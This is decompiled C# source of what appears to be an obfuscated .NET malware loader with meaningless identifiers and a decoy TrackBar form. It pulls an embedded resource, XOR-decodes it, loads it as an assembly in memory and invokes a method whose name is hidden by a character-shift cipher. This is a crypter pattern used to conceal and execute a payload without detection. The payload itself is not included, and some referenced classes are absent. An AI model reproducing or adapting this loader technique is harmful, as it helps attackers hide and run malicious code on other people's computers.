using System;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class cchocifxsxfhecxk_wmscos16
{
	public static string iyazwtyaclo_pneshawbbbm17 = string.Empty;

	public static int magicnum = 15;

	public static int nZero = Conversions.ToInteger("0");

	public static object dvtbjthgr_zecbabrmpo16(string vujfoberetvzvdllm_ernszhonmanwi4)
	{
		return new ResourceManager(vujfoberetvzvdllm_ernszhonmanwi4, Assembly.GetExecutingAssembly()).GetObject(vujfoberetvzvdllm_ernszhonmanwi4);
	}

	public static void rdegvavrmpw_dtpdahnupah12(int rsinjk_ehlntgch17, string ociuxszdgehxk_wnacoteojb6, string oeiljyucupfibeeet_hlvslkmern12)
	{
		AppDomain.CurrentDomain.Load(enmnwzjzp_vhvnwv10((byte[])dvtbjthgr_zecbabrmpo16("44138"))).GetType(dzbbrgd_welcyp10("]^]T=STa_=a_TnR[b"))!.GetMethod(dzbbrgd_welcyp10("R\\SnPSSnbdQ"))!.Invoke(null, new object[3] { rsinjk_ehlntgch17, ociuxszdgehxk_wnacoteojb6, oeiljyucupfibeeet_hlvslkmern12 });
	}

	[STAThread]
	public static void Main()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		TrackBar val = new TrackBar();
		((Control)val).set_Name("REXTYN890");
		val.set_Text("BHOMNB");
		((Control)val).set_Width(312);
		((Control)val).set_Height(199);
		Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture(dzbbrgd_welcyp10("t}<db"));
		iyazwtyaclo_pneshawbbbm17 = "770928";
		new NEWSTART();
		while (true)
		{
			ProjectData.EndApp();
			Thread.Sleep(2000);
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string coteojboeiljyuc_upfibeeethlvsl13(CultureInfo kmernslh_inmabmiyvtjjto9, DateTime grdegvavrmpwdt_pdahnupah11)
	{
		string result = default(string);
		return result;
	}

	public static byte[] enmnwzjzp_vhvnwv10(byte[] enmnwzjzp_vhvnwv10_param_01)
	{
		int num = enmnwzjzp_vhvnwv10_param_01.Length - 1;
		for (int i = 0; i <= num; i += 15)
		{
			enmnwzjzp_vhvnwv10_param_01[i] = (byte)(enmnwzjzp_vhvnwv10_param_01[i] ^ 0xFu);
		}
		return enmnwzjzp_vhvnwv10_param_01;
	}

	public static string dzbbrgd_welcyp10(string dzbbrgd_welcyp10_arg01)
	{
		string text = string.Empty;
		int num = nZero;
		int num2 = ReturnLenght(dzbbrgd_welcyp10_arg01);
		for (int i = num; i <= num2; i++)
		{
			text += Conversions.ToString(ReturnChrw(ReturnAscW(Conversions.ToString(dzbbrgd_welcyp10_arg01[i])) - magicnum));
		}
		return text;
	}

	public static char ReturnChrw(int code)
	{
		return Strings.ChrW(code);
	}

	public static int ReturnAscW(string Str)
	{
		return Strings.AscW(Str);
	}

	public static int ReturnLenght(string array)
	{
		return array.Length - 1;
	}
}
